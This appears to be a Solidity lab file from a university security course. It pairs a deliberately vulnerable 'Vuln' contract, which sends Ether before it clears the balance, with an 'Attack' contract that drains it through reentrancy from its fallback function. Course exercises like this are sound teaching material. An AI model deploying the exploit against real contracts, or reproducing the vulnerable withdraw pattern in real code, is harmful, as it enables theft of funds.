pragma solidity ^0.5.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        // Refund their balance
        //uint takemoney=balances[msg.sender];
        //(bool success, )=msg.sender.call.value(takemoney)("");
        msg.sender.call.value(balances[msg.sender])("");
        //require(success);
        
        // Set their balance to 0
        balances[msg.sender] = 0;
    }

}

contract Attack {
    //Vuln public vuln;

    Vuln public vuln=Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));
    
    uint public current_bal;
    function steal_ether () public payable{
        if(msg.value>=0){
            current_bal=address(this).balance;
            vuln.deposit.value(msg.value)();
            vuln.withdraw();
        }
    }

    
    function () external payable {
        uint balance_in_rec=address(this).balance;
        if( 2*msg.value > (balance_in_rec - current_bal)){
            vuln.withdraw();
        }
    }
    
}